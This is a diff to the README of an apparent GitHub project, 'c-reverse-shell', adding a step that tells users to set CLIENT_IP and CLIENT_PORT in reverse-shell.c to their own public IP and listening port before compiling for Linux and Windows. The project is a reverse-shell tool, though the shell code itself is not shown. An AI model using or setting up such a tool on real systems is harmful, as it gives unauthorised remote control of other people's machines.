@@ -18,7 +18,20 @@ sudo apt install gcc-mingw-w64
 git clone https://github.com/izenynn/c-reverse-shell.git
 ```
 
-2. Compile for Linux and Windows with `make` (equivalent to `make all`):
+2. Change the `CLIENT_IP` and `CLIENT_PORT` in the file `reverse-shell.c` (lines 20 and 21):
+```diff
+ /* ================================================== */
+ /* |      CHANGE THIS TO YOUR IP AND YOUR PORT      | */
+ /* ================================================== */
+-#define CLIENT_IP "0.0.0.0"
+-#define CLIENT_PORT (int)0
++#define CLIENT_IP "[YOUR_PUBLIC_IP]"
++#define CLIENT_PORT (int)[PORT_YOUR_ARE_LISTENING_TO]
+ /* ================================================== */
+```
+
+
+3. Compile for Linux and Windows with `make` (equivalent to `make all`):
 ```sh
 make
 ```
